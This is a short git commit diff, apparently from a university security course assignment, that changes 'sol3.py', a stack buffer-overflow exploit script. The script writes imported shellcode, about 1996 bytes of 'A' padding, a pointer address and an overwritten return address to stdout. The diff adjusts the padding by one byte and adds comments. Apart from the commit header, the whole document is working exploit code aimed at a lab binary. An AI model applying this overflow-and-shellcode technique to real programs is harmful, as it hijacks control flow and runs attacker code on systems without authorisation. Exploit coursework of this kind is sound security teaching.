09783a8005db9847c8dcfe85791a0d16f1dbf879
marymx <marymx@umich.edu>
2022-03-30 18:43:29 +0000

    Automatic commit by test script for marymx yaoche

--- sol3.py
+++ sol3.py
@@ -1,6 +1,6 @@
 import sys
 from shellcode import shellcode
 
-addr = 0xfff6b198.to_bytes(4, "little")
-ret_addr= 0xfff6b9a4.to_bytes(4,"little")
-sys.stdout.buffer.write(shellcode + b"A" * 1995 + addr+ ret_addr)
+addr = 0xfff6b198.to_bytes(4, "little") #adress for p
+ret_addr= 0xfff6b9a4.to_bytes(4,"little") #main return adress
+sys.stdout.buffer.write(shellcode + b"A" * 1996 + addr+ ret_addr)
